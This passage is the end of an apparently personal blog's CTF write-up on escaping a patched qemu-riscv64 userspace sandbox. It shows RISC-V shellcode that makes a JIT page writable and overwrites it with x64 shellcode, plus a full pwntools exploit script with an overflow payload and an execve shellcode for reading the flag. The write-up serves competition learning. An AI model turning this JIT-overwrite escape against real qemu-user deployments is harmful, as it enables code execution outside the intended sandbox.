class="line">	addi a3, a3, <span class="number">-4</span> </span><br><span class="line">	beq a2, zero,  finish</span><br><span class="line">	addi a2, a2, <span class="number">-1</span> </span><br><span class="line">	j copy</span><br><span class="line"></span><br><span class="line">finish:</span><br><span class="line">	li a7, <span class="number">93</span> <span class="meta"># exit</span></span><br><span class="line">	ecall</span><br></pre></td></tr></table></figure>
<p>The assembly code works as follow:</p>
<ol>
<li>search for JIT code page with <code>mprotect(va+0xf000, 0x1000, 7)</code>, the offset is changed from 0x4000 to 0xf000, because we found that 0x4000 does not on remote machine.</li>
<li>receive x64 shellcode from read(0, 0x7000, 0x200)</li>
<li>copy the x64 shellcode from 0x7000 to va, from higher address to lower address, avoiding ruin the running JIT code by accident.<br>And the python exploit is like:<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">env = &#123;<span class="string">'LD_PRELOAD'</span>: <span class="string">''</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    p = process(<span class="string">'./cmd'</span>)</span><br><span class="line">    is_remote = <span class="literal">False</span></span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">    p = remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    is_remote = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> is_remote:</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    <span class="comment"># subprocess.call(['tmux', 'split-window', '-h', 'gdb-multiarch', '-x', '1.gdb'])</span></span><br><span class="line">    pid = subprocess.check_output([<span class="string">'pidof'</span>, <span class="string">'qemu-riscv64'</span>])</span><br><span class="line">    pid = pid.strip()</span><br><span class="line">    subprocess.call([<span class="string">'tmux'</span>, <span class="string">'split-window'</span>, <span class="string">'-h'</span>, <span class="string">'gdb'</span>, <span class="string">'attach'</span>, pid])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_sc</span><span class="params">()</span>:</span></span><br><span class="line">    subprocess.call([<span class="string">"./build_sc.sh"</span>])</span><br><span class="line"></span><br><span class="line">update_sc()</span><br><span class="line">sc = open(<span class="string">"sc.bin"</span>, <span class="string">"rb"</span>).read()</span><br><span class="line"><span class="keyword">assert</span> <span class="string">"\n"</span> <span class="keyword">not</span> <span class="keyword">in</span> sc</span><br><span class="line"></span><br><span class="line">gets = <span class="number">0x16a5a</span></span><br><span class="line">call_gets = <span class="number">0x10442</span></span><br><span class="line"></span><br><span class="line">data = cyclic(<span class="number">280</span>) + p64(<span class="number">0x6f000</span> + <span class="number">0x128</span>)</span><br><span class="line">data += p64(call_gets)</span><br><span class="line">data += cyclic(<span class="number">504</span>) + p64(<span class="number">0x6f000</span>)</span><br><span class="line"><span class="comment"># data += p64()</span></span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br><span class="line">sla(<span class="string">"flag:"</span>, data)</span><br><span class="line"></span><br><span class="line">sl(sc)</span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br><span class="line">x86_shellcode = asm(shellcraft.linux.execve(<span class="string">"/readflag2"</span>) + shellcraft.linux.exit())</span><br><span class="line"><span class="comment"># x86_shellcode = asm(shellcraft.amd64.infloop())</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"\x90"</span>*<span class="number">0x100</span> + x86_shellcode</span><br><span class="line">payload.ljust(<span class="number">0x200</span>, <span class="string">"\x00"</span>)</span><br><span class="line">se(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#flag&#123;qemu_user_s4ndb0x_is_dangerous&#125;</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>This will give us the last flag.</p>
<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul>
<li><a href="https://ghidra-sre.org/releaseNotes_9.2.html" target="_blank" rel="noopener">https://ghidra-sre.org/releaseNotes_9.2.html</a></li>
<li><a href="https://en.wikipedia.org/wiki/Salsa20" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Salsa20</a></li>
<li><a href="https://matshao.com/2020/05/18/DEFCON-2020-Quals-nooopsled/">https://matshao.com/2020/05/18/DEFCON-2020-Quals-nooopsled/</a></li>
</ul>

      
    </div>

    <div>
      
        

      
    </div>

    <div>
      
        

      
    </div>


    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/Hack/" rel="tag"># Hack</a>
          
        </div>
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2020/12/31/Booklist2020/" rel="next" title="Booklist2020">
                <i class="fa fa-chevron-left"></i> Booklist2020
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
          </div>
        </div>
      

      
      
    </footer>
  </article>



    <div class="post-spread">
      
    </div>
  </div>

          
          </div>
          


          
  <div class="comments" id="comments">
    
  </div>


        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目錄
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview">
            本站概覽
          </li>
        </ul>
      

      <section class="site-overview sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="Matthew Shao">
          <p class="site-author-name" itemprop="name">Matthew Shao</p>
          <p class="site-description motion-element" itemprop="description">坐中使气如秦侠 陌上行歌类楚狂</p>
        </div>
        <nav class="site-state motion-element">
        
          
            <div class="site-state-item site-state-posts">
              <a href="/archives">
                <span class="site-state-item-count">63</span>
                <span class="site-state-item-name">文章</span>
              </a>
            </div>
          

          
            <div class="site-state-item site-state-categories">
              <a href="/categories">
                <span class="site-state-item-count">2</span>
                <span class="site-state-item-name">分類</span>
              </a>
            </div>
          

          
            <div class="site-state-item site-state-tags">
              <a href="/tags">
                <span class="site-state-item-count">14</span>
                <span class="site-state-item-name">標籤</span>
              </a>
            </div>
          

        </nav>

        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/MatthewShao" target="_blank" title="Github">
                  
                    <i class="fa fa-fw fa-globe"></i>
                  
                  Github
                </a>
              </span>
            
          
        </div>

        
        

        
        

        


      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Recon"><span class="nav-number">1.</span> <span class="nav-text">Recon</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#main-riscv64-elf-file"><span class="nav-number">1.1.</span> <span class="nav-text">main: riscv64 elf file</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#qemu-riscv64-patched-qemu-userspace-emulator"><span class="nav-number">1.2.</span> <span class="nav-text">qemu-riscv64: patched qemu userspace emulator</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#entry-launcher-script"><span class="nav-number">1.3.</span> <span class="nav-text">entry: launcher script</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Favourite-Architecture-0"><span class="nav-number">2.</span> <span class="nav-text">Favourite Architecture 0</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Favourite-Architecture-1"><span class="nav-number">3.</span> <span class="nav-text">Favourite Architecture 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Favourite-Architecture-2"><span class="nav-number">4.</span> <span class="nav-text">Favourite Architecture 2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#References"><span class="nav-number">5.</span> <span class="nav-text">References</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Matthew Shao</span>
</div>


<div class="powered-by">
  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 強力驅動
</div>

<div class="theme-info">
  主題 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Logos
  </a>
</div>


        

        
      </div>
    </footer>

    <div class="back-to-top">
      <i class="fa fa-arrow-up"></i>
    </div>
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  




  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>



  
  


  <script type="text/javascript" src="/js/src/schemes/logos.js?v=5.1.0"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>



  



  




	





  





  

  




  
  

  

  

  

  


</body>
</html>
